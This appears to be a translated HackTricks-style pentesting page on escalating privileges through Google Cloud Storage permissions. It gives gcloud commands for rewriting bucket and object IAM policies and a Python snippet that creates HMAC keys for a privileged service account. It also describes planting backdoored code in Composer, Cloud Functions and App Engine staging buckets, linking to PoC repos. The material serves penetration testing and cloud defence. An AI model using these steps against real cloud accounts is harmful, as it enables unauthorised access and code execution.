# GCP - Storage Privesc

{{#include ../../../banners/hacktricks-training.md}}

## 存储

Basic Information:

{{#ref}}
../gcp-services/gcp-storage-enum.md
{{#endref}}

### `storage.objects.get`

此权限允许你**下载保存在 Cloud Storage 中的文件**。这可能使你提升权限，因为在某些情况下**敏感信息会保存在那里**。此外，一些 GCP 服务会将它们的信息存放在存储桶中：

- **GCP Composer**：当你创建一个 Composer Environment 时，所有 DAG 的**代码**会保存在一个**存储桶**中。这些任务的代码中可能包含有价值的信息。
- **GCR (Container Registry)**：容器的**镜像**存放在**存储桶**中，这意味着如果你能读取这些存储桶，就可以下载镜像并**搜索 leaks 和/或 源代码**。

### `storage.objects.setIamPolicy`

它可以让你**abuse 本节之前的任何场景**。
```bash
# Add binding
gcloud storage objects add-iam-policy-binding gs://<BUCKET_NAME>/<OBJECT_NAME> \
--member="<MEMBER_TYPE>:<MEMBER_IDENTIFIER>" \
--role="<ROLE>" \
--project=<PROJECT_ID>

# Remove binding
gcloud storage objects remove-iam-policy-binding gs://<BUCKET_NAME>/<OBJECT_NAME> \
--member="<MEMBER_TYPE>:<MEMBER_IDENTIFIER>" \
--role="<ROLE>" \
--project=<PROJECT_ID>

# Change Policy
gcloud storage objects set-iam-policy gs://<BUCKET_NAME>/<OBJECT_NAME> - \
--project=<PROJECT_ID> <<'POLICY'
{
"bindings": [
{
"role": "<ROLE>",
"members": [
"<MEMBER_TYPE>:<MEMBER_IDENTIFIER>"
]
}
]
}
POLICY

```
### **`storage.buckets.setIamPolicy`**

有关如何使用此权限修改访问权限的示例，请查看此页面：
```bash
# Add binding
gcloud storage buckets add-iam-policy-binding gs://<MY_BUCKET> \
--member="<MEMBER_TYPE>:<MEMBER_IDENTIFIER>" \
--role=<ROLE> \
--project=<MY_PROJECT>

# Remove binding
gcloud storage buckets remove-iam-policy-binding gs://<MY_BUCKET> \
--member="<MEMBER_TYPE>:<MEMBER_IDENTIFIER>" \
--role=<ROLE> \
--project=<MY_PROJECT>

# Change policy
gcloud storage buckets set-iam-policy gs://<BUCKET_NAME> - \
--project=<PROJECT_ID> <<'POLICY'
{
"bindings": [
{
"role": "<ROLE>",
"members": [
"<MEMBER_TYPE>:<MEMBER_IDENTIFIER>"
]
}
]
}
POLICY

```
{{#ref}}
../gcp-unauthenticated-enum-and-access/gcp-storage-unauthenticated-enum/gcp-public-buckets-privilege-escalation.md
{{#endref}}

### `storage.hmacKeys.create`

Cloud Storage 的 "interoperability" 功能，旨在用于像 AWS S3 这样的 **cross-cloud interactions**，涉及 **creation of HMAC keys for Service Accounts and users**。攻击者可以通过 **generating an HMAC key for a Service Account with elevated privileges** 利用此机制，从而在 Cloud Storage 中 **escalating privileges within Cloud Storage**。尽管与用户关联的 HMAC keys 只能通过 web console 检索，但 access and secret keys 保持 **perpetually accessible**，可以作为潜在的备份访问存储。相反，关联到 Service Account 的 HMAC keys 可通过 API 访问，但它们的 access and secret keys 在创建后无法检索，这为持续访问增加了一层复杂性。
```bash
# Create key
gsutil hmac create <sa-email> # You might need to execute this inside a VM instance

## If you have TROUBLES creating the HMAC key this was you can also do it contacting the API directly:
PROJECT_ID = '$PROJECT_ID'
TARGET_SERVICE_ACCOUNT = f"exam-storage-sa-read-flag-3@{PROJECT_ID}.iam.gserviceaccount.com"
ACCESS_TOKEN = "$CLOUDSDK_AUTH_ACCESS_TOKEN"
import requests
import json
key = requests.post(
f'https://www.googleapis.com/storage/v1/projects/{PROJECT_ID}/hmacKeys',
params={'access_token': ACCESS_TOKEN, 'serviceAccountEmail': TARGET_SERVICE_ACCOUNT}
).json()
#print(json.dumps(key, indent=4))
print(f'ID: {key["metadata"]["accessId"]}')
print(f'Secret: {key["secret"]}')


# Configure gsutil to use the HMAC key
gcloud config set pass_credentials_to_gsutil false
gsutil config -a

# Use it
gsutil ls gs://[BUCKET_NAME]

# Restore
gcloud config set pass_credentials_to_gsutil true
```
另一个针对该方法的 exploit 脚本可以在 [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/storage.hmacKeys.create.py) 找到。

### `storage.objects.create`, `storage.objects.delete` = Storage 写入权限

要在存储桶内**创建新对象**，你需要 `storage.objects.create`，并且根据 [the docs](https://cloud.google.com/storage/docs/access-control/iam-permissions#object_permissions)，要**修改**已存在的对象，你还需要 `storage.objects.delete`。

在可写的存储桶中非常常见的一种利用场景是当该**存储桶保存着 Web 服务器文件**时，你可能能够**存储新的代码**，并被 Web 应用使用。

### Composer

**Composer** 是在 **GCP** 中托管的 **Apache Airflow**。它有几个有趣的特性：

- 它运行在 **GKE 集群** 中，因此集群使用的 **SA 可被 Composer 内运行的代码访问**
- Composer 环境的所有组件（**DAGs 的代码**、插件和数据）都存储在 GCP 的一个存储桶中。如果攻击者对其具有读写权限，他可以监控该存储桶，并且**每当 DAG 被创建或更新时，提交一个带后门的版本**，这样 Composer 环境就会从 Storage 获取这个带后门的版本。

**You can find a PoC of this attack in the repo:** [**https://github.com/carlospolop/Monitor-Backdoor-Composer-DAGs**](https://github.com/carlospolop/Monitor-Backdoor-Composer-DAGs)

### Cloud Functions

- Cloud Functions 的代码存储在 Storage 中，每当创建新版本时代码会被推送到存储桶，然后根据这些代码构建新的容器。因此，**在新版本构建之前覆盖代码，就有可能使 Cloud Function 执行任意代码**。

**You can find a PoC of this attack in the repo:** [**https://github.com/carlospolop/Monitor-Backdoor-Cloud-Functions**](https://github.com/carlospolop/Monitor-Backdoor-Cloud-Functions)

### App Engine

AppEngine 的版本会在一个格式为 `staging.<project-id>.appspot.com` 的存储桶中生成一些数据。在该存储桶内，可以找到一个名为 `ae` 的文件夹，里面会为 AppEngine 应用的每个版本包含一个文件夹，并且在这些文件夹内可以找到 `manifest.json` 文件。该文件包含一个 JSON，其中列出了用于创建特定版本的所有文件。此外，还可以找到**文件的真实名称、它们在 GCP 存储桶中的 URL（存储桶内的文件名已改为其 sha1 哈希）以及每个文件的 sha1 哈希。**

_Note that it's not possible to pre-takeover this bucket because GCP users aren't authorized to generate buckets using the domain name appspot.com._

然而，如果对该存储桶具有读写访问权限，可以通过监控该存储桶并在每次发生更改（新版本）时尽快修改新版本，从而升级到附加在 App Engine 版本上的 SA。这样，由这些代码创建的容器就会执行带后门的代码。

上述攻击可以通过多种方式实现，所有方法都从监控 `staging.<project-id>.appspot.com` 存储桶开始：

- 将 AppEngine 版本的完整新代码上传到另一个可用的存储桶，并准备一个包含新存储桶名称和它们 sha1 哈希的 **`manifest.json` 文件**。然后，当存储桶中创建新版本时，你只需修改 `manifest.json` 并上传恶意版本即可。
- 上传一个被修改的 `requirements.txt`，使其使用**恶意依赖代码**，并更新 `manifest.json` 文件以包含新的文件名、URL 及其哈希。
- 上传一个**被修改的 `main.py` 或 `app.yaml` 文件（将执行恶意代码）**，并更新 `manifest.json`，包含新的文件名、URL 及其哈希。

**You can find a PoC of this attack in the repo:** [**https://github.com/carlospolop/Monitor-Backdoor-AppEngine**](https://github.com/carlospolop/Monitor-Backdoor-AppEngine)

### GCR

- **Google Container Registry** 将镜像存储在存储桶中，如果你能对这些存储桶**执行写入**，你可能能够**横向移动到运行这些存储桶的地方。**
- GCR 使用的存储桶的 URL 类似于 `gs://<eu/usa/asia/nothing>.artifacts.<project>.appspot.com`（顶级子域在 [here](https://cloud.google.com/container-registry/docs/pushing-and-pulling) 指定）。

> [!TIP]
> 此服务已弃用，因此该攻击不再有用。此外，Artifact Registry（替代此服务）并不将镜像存储在存储桶中。

## **References**

- [https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/#:\~:text=apiKeys.-,create,privileges%20than%20our%20own%20user.](https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/)

{{#include ../../../banners/hacktricks-training.md}}
